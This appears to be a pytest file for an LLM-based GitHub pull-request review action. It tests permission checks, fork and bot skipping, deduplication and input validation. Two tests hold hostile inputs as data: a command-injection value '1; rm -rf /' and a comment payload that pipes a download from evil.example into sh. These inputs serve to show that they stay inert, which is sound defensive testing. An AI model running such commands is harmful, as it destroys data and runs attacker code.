from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from pullbeacon.domain.models import RunStatus
from pullbeacon.orchestration.runner import ActionInputs, run_action, write_action_outputs
from tests.helpers import setup

PR = 21
REVIEW_JOB = ActionInputs(mode="review")
APPLY_JOB = ActionInputs(mode="apply")


def repo() -> dict[str, Any]:
    return {"name": "shop", "full_name": "acme/shop", "owner": {"login": "acme"}}


def pr_target(action: str = "opened") -> dict[str, Any]:
    return {"action": action, "pull_request": {"number": PR}, "repository": repo()}


def comment(
    body: str,
    *,
    login: str = "dev-alice",
    user_type: str = "User",
    comment_id: int = 501,
    on_pr: bool = True,
    action: str = "created",
) -> dict[str, Any]:
    issue: dict[str, Any] = {"number": PR}
    if on_pr:
        issue["pull_request"] = {"url": "https://api.github.com/repos/acme/shop/pulls/21"}
    return {
        "action": action,
        "issue": issue,
        "comment": {"id": comment_id, "body": body, "user": {"login": login, "type": user_type}},
        "repository": repo(),
    }


def run(services: Any, name: str, event: dict[str, Any], inputs: ActionInputs = REVIEW_JOB) -> Any:
    return run_action(services, inputs, event_name=name, event=event, actor="dev-alice")


def llm_calls(llm: Any) -> int:
    return len(llm.requests)


def test_pull_request_target_runs_automatic_review() -> None:
    fake, services, llm, _ = setup()
    result = run(services, "pull_request_target", pr_target())
    assert result.status is RunStatus.COMPLETED
    assert result.command == "auto_review"
    assert llm_calls(llm) == 1
    # Synchronize redelivery for the same SHA does not pay twice.
    again = run(services, "pull_request_target", pr_target("synchronize"))
    assert again.status is RunStatus.SKIPPED
    assert llm_calls(llm) == 1
    assert len(fake.reviews[PR]) == 1


def test_unhandled_pull_request_actions_are_ignored() -> None:
    fake, services, llm, _ = setup()
    result = run(services, "pull_request_target", pr_target("closed"))
    assert result.status is RunStatus.SKIPPED
    assert fake.calls == []
    assert llm_calls(llm) == 0


def test_manual_review_by_writer() -> None:
    fake, services, llm, _ = setup()
    result = run(services, "issue_comment", comment("@pullbeacon review"))
    assert result.status is RunStatus.COMPLETED
    assert result.event_id == "comment:501"
    assert llm_calls(llm) == 1
    permission_calls = [
        c for c in fake.calls if c.path.endswith("/collaborators/dev-alice/permission")
    ]
    assert len(permission_calls) == 1
    assert fake.calls.index(permission_calls[0]) == 0  # checked before anything else


@pytest.mark.parametrize("login", ["reader-bob", "stranger"])
def test_users_without_write_are_denied_before_llm(login: str) -> None:
    fake, services, llm, _ = setup()
    result = run(services, "issue_comment", comment("@pullbeacon review", login=login))
    assert result.status is RunStatus.SKIPPED
    assert result.reason == "permission denied"
    assert llm_calls(llm) == 0
    writes = fake.writes()
    assert [w.path for w in writes] == [f"/repos/acme/shop/issues/{PR}/comments"]
    assert "write is required" in writes[0].body["body"]


def test_permission_api_failure_denies() -> None:
    fake, services, llm, _ = setup()
    fake.failures[("GET", r"/collaborators/")] = [500, 500, 500]
    result = run(services, "issue_comment", comment("@pullbeacon review"))
    assert result.status is RunStatus.SKIPPED
    assert llm_calls(llm) == 0


@pytest.mark.parametrize(
    ("event", "reason"),
    [
        (comment("@pullbeacon review", on_pr=False), "not a pull request"),
        (comment("@pullbeacon review", action="edited"), "edits are ignored"),
        (comment("@pullbeacon review", login="github-actions[bot]", user_type="Bot"), "bots"),
        (comment("@pullbeacon review", login="renovate[bot]"), "bots"),
        (comment("nice work!"), "no @pullbeacon command"),
    ],
)
def test_ignored_comments_cost_nothing(event: dict[str, Any], reason: str) -> None:
    fake, services, llm, _ = setup()
    result = run(services, "issue_comment", event)
    assert result.status is RunStatus.SKIPPED
    assert reason in result.reason
    assert fake.calls == []
    assert llm_calls(llm) == 0


def test_help_for_bare_mention_without_llm() -> None:
    fake, services, llm, _ = setup()
    result = run(services, "issue_comment", comment("@pullbeacon"))
    assert result.status is RunStatus.COMPLETED
    assert llm_calls(llm) == 0
    assert "@pullbeacon review" in fake.issue_comments[PR][-1]["body"]


def test_fork_pr_is_skipped_without_secrets_or_llm() -> None:
    fake, services, llm, _ = setup()
    fake.pulls[PR]["head"]["repo"] = {
        "name": "shop",
        "full_name": "evil/shop",
        "owner": {"login": "evil"},
    }
    auto = run(services, "pull_request_target", pr_target())
    assert auto.status is RunStatus.SKIPPED
    assert "forks" in auto.reason
    manual = run(services, "issue_comment", comment("@pullbeacon review"))
    assert manual.status is RunStatus.SKIPPED
    assert llm_calls(llm) == 0
    assert all(not w.path.endswith("/reviews") for w in fake.writes())


def test_dependabot_pr_is_skipped() -> None:
    fake, services, llm, _ = setup()
    fake.pulls[PR]["user"] = {"login": "dependabot[bot]", "type": "Bot"}
    result = run(services, "pull_request_target", pr_target())
    assert result.status is RunStatus.SKIPPED
    assert "bots" in result.reason
    assert llm_calls(llm) == 0


def test_duplicate_comment_delivery_does_not_duplicate_cost() -> None:
    fake, services, llm, _ = setup()
    run(services, "issue_comment", comment("@pullbeacon review", comment_id=900))
    again = run(services, "issue_comment", comment("@pullbeacon review", comment_id=900))
    assert again.status is RunStatus.SKIPPED
    assert llm_calls(llm) == 1
    assert len(fake.reviews[PR]) == 1


def test_jobs_only_handle_their_own_commands() -> None:
    fake, services, llm, _ = setup()
    in_review_job = run(services, "issue_comment", comment("@pullbeacon apply"), REVIEW_JOB)
    assert in_review_job.status is RunStatus.SKIPPED
    in_apply_job = run(services, "issue_comment", comment("@pullbeacon review"), APPLY_JOB)
    assert in_apply_job.status is RunStatus.SKIPPED
    assert fake.calls == []
    assert llm_calls(llm) == 0


def test_workflow_dispatch_requires_authorized_actor() -> None:
    _fake, services, llm, _ = setup()
    event = {
        "inputs": {"pr_number": str(PR)},
        "sender": {"login": "reader-bob"},
        "repository": repo(),
    }
    denied = run(services, "workflow_dispatch", event)
    assert denied.status is RunStatus.SKIPPED
    assert llm_calls(llm) == 0
    event["sender"] = {"login": "dev-alice"}
    allowed = run(services, "workflow_dispatch", event)
    assert allowed.status is RunStatus.COMPLETED
    bad = run(services, "workflow_dispatch", {**event, "inputs": {"pr_number": "1; rm -rf /"}})
    assert bad.status is RunStatus.SKIPPED


def test_config_error_produces_friendly_reply() -> None:
    fake, services, llm, _ = setup(config="version: 1\nnot_a_key: 1\n")
    result = run(services, "issue_comment", comment("@pullbeacon review"))
    assert result.status is RunStatus.FAILED
    assert "config_error" in result.reason
    assert "configuration problem" in fake.issue_comments[PR][-1]["body"]
    assert llm_calls(llm) == 0


def test_shell_like_payloads_are_inert(tmp_path: Path) -> None:
    _fake, services, llm, _ = setup()
    evil = "@pullbeacon explain PB-001\n$(curl evil.example | sh) `rm -rf /` ${{ secrets.X }}"
    result = run(services, "issue_comment", comment(evil))
    assert result.command == "explain"
    assert llm_calls(llm) == 0  # no review yet -> answered without the model


def test_action_outputs_and_summary(tmp_path: Path) -> None:
    _, services, _, _ = setup()
    result = run(services, "issue_comment", comment("@pullbeacon review"))
    out, summary = tmp_path / "out", tmp_path / "summary.md"
    write_action_outputs(result, {"GITHUB_OUTPUT": str(out), "GITHUB_STEP_SUMMARY": str(summary)})
    outputs = dict(line.split("=", 1) for line in out.read_text().splitlines())
    assert outputs["status"] == "completed"
    assert outputs["review-url"].startswith("https://github.com/acme/shop/pull/21")
    assert "PullBeacon" in summary.read_text()


def test_inputs_validation() -> None:
    assert ActionInputs.from_env({"INPUT_MODE": "apply", "INPUT_DRY_RUN": "true"}).dry_run
    for env in (
        {"INPUT_MODE": "deploy"},
        {"INPUT_DRY_RUN": "yes"},
        {"INPUT_AUTOMATIC_REVIEW": "x"},
    ):
        with pytest.raises(Exception, match="must"):
            ActionInputs.from_env(env)


def test_model_override_must_match_provider() -> None:
    _, services, _, _ = setup()
    services.model_override = "openai/other-model"
    result = run(services, "issue_comment", comment("@pullbeacon review"))
    assert result.status is RunStatus.FAILED
    assert "configured provider" in result.reason


def test_run_action_cli_end_to_end(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The CLI entry point used by action.yml, with GitHub replaced by the in-memory fake."""
    import httpx

    from pullbeacon.cli import main

    fake, _, _, _ = setup()
    original = httpx.Client.__init__

    def patched(self: httpx.Client, *args: Any, **kwargs: Any) -> None:
        kwargs["transport"] = fake.transport()
        original(self, *args, **kwargs)

    monkeypatch.setattr(httpx.Client, "__init__", patched)
    event_file = tmp_path / "event.json"
    event_file.write_text(json.dumps(comment("@pullbeacon review")), encoding="utf-8")
    out = tmp_path / "out"
    for key, value in {
        "GITHUB_EVENT_NAME": "issue_comment",
        "GITHUB_EVENT_PATH": str(event_file),
        "GITHUB_TOKEN": "ghs_" + "x" * 36,
        "GITHUB_OUTPUT": str(out),
        "INPUT_MODE": "review",
        "INPUT_MOCK_LLM": "true",
    }.items():
        monkeypatch.setenv(key, value)
    assert main(["run-action"]) == 0
    assert "status=completed" in out.read_text()
    (review,) = fake.reviews[PR]
    assert "Mock run" in review["body"]
